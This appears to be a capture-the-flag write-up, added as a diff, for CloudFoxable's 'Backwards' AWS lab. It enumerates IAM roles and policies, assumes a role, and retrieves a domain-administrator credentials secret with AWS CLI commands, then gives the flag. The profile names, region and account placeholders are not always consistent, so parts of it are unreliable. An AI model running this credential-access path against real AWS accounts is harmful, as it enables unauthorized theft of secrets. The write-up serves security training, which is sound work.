@@ -1,0 +1,65 @@
+# Backwards Challenge Write-up
+
+## **Overview**
+The "Backwards" challenge in CloudFoxable mirrors a realistic cloud penetration testing scenario, where the goal is to start from a valuable AWS resource and trace back to identify who can access it. In this exercise, the focus is on an AWS Secrets Manager ARN, and the task involves analyzing which IAM roles or users have the necessary permissions. After identifying them, those permissions are then used to successfully retrieve the secret
+## **Starting Point**
+ARN: `arn:aws:secretsmanager:us-east-1:ACCOUNTID:secret:DomainAdministrator-Credentials-SUFFIX`
+
+CloudFoxable Setup: None required.
+
+## **Challenge Breakdown**
+1. **Enumerating IAM Roles**
+   - List all IAM roles in the environment:
+     ```sh
+     aws iam list-roles --profile cloudflux-admin
+     ```
+   - Identified roles that can be assumed by `ctf-starting-user`.
+   - From the output, determined that `Alexander-Arnold` is an assumable role.
+
+2. **Checking Role Permissions**
+   - Enumerated permissions assigned to the `Alexander-Arnold` role:
+     ```sh
+     aws iam list-attached-role-policies --role-name Alexander-Arnold --profile cloudflux-admin
+     ```
+   - Retrieved the policy details:
+     ```sh
+     aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/corporate-domain-admin-password-policy --version-id v1 --profile cloudflux-admin
+     ```
+   - The policy allows `secretsmanager:GetSecretValue` on the target secret.
+
+3. **Identifying the Secret Name**
+   - Use AWS CLI to list available secrets:
+     ```sh
+     aws secretsmanager list-secrets --profile cloudflux-admin
+     ```
+   - Confirm that the secret name is `DomainAdministrator-Credentials`.
+
+4. **Assuming the Role**
+   - Configure an AWS CLI profile for `Alexander Arnold`:
+     ```ini
+     [profile Alexander Arnold]
+     region = us-west-2
+     role_arn = arn:aws:iam::ACCOUNT_ID:role/Alexander-Arnold
+     source_profile = cloudflux-admin
+     ```
+   - Assume the role and retrieve the secret value:
+     ```sh
+     aws secretsmanager get-secret-value --secret-id DomainAdministrator-Credentials --profile Alexander-Arnold
+     ```
+
+5. **Retrieving the Flag**
+   - The flag is successfully retrieved by executing the final command.
+
+## **Flag**
+FLAG{backwards::IfYouFindSomethingInterstingFindWhoHasAccessToIt}
+
+## **Key Takeaways**
+- In cloud penetration testing, the process often begins by tracing access paths from a discovered resource.
+- Access isn’t always directly granted—trust policies in roles can create indirect or hidden access routes.
+- Tools like CloudFox are highly effective for enumerating permissions and identifying assumable roles.
+- A deep understanding of AWS IAM is essential for identifying security gaps and potential privilege escalation paths during assessments.
+
+
+## **Conclusion**
+
+This challenge emphasizes the critical need to understand IAM roles, trust policies, and permission structures when conducting cloud security assessments. Through methodical enumeration of roles and policies, we identified a role that could be assumed and had the required permissions to access a sensitive secret. This technique is a core aspect of cloud penetration testing and highlights the importance of enforcing strict access controls to safeguard sensitive resources from unauthorized access in cloud environments.
